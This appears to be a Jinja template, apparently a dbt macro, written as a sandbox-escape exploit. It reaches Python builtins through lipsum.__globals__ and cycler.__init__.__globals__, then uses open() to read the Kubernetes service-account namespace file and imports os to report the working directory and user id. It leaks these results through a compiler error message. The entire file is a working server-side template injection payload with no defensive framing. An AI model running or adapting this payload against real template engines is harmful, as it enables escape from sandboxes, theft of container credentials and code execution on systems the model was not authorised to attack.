{# Lipsum sandbox escape - access Python builtins #}
{% set ns = namespace(output='[LIPSUM] ') %}

{# Test 1: Can we access lipsum globals? #}
{% set lg = lipsum.__globals__ %}
{% set ns.output = ns.output ~ 'globals_keys=' ~ lg.keys() | list | string | truncate(300) %}

{# Test 2: Access __builtins__ #}
{% if '__builtins__' in lg %}
  {% set builtins = lg['__builtins__'] %}
  {% set ns.output = ns.output ~ ' | builtins_type=' ~ builtins.__class__.__name__ %}

  {# Test 3: Try to get open() #}
  {% if builtins is mapping and 'open' in builtins %}
    {% set ns.output = ns.output ~ ' | open=YES' %}
    {% set f = builtins['open']('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') %}
    {% set content = f.read() %}
    {% do f.close() %}
    {% set ns.output = ns.output ~ ' | k8s_ns=' ~ content %}
  {% elif builtins.__class__.__name__ == 'module' %}
    {% set ns.output = ns.output ~ ' | builtins_is_module' %}
  {% endif %}

  {# Test 4: Try __import__ #}
  {% if builtins is mapping and '__import__' in builtins %}
    {% set ns.output = ns.output ~ ' | import=YES' %}
    {% set os = builtins['__import__']('os') %}
    {% set ns.output = ns.output ~ ' | cwd=' ~ os.getcwd() %}
    {% set ns.output = ns.output ~ ' | uid=' ~ os.getuid() %}
  {% endif %}
{% endif %}

{# Test 5: Alternative - cycler.__init__.__globals__ #}
{% set cg = cycler.__init__.__globals__ %}
{% set ns.output = ns.output ~ ' | cycler_globals=' ~ cg.keys() | list | string | truncate(200) %}

{{ exceptions.raise_compiler_error(ns.output) }}
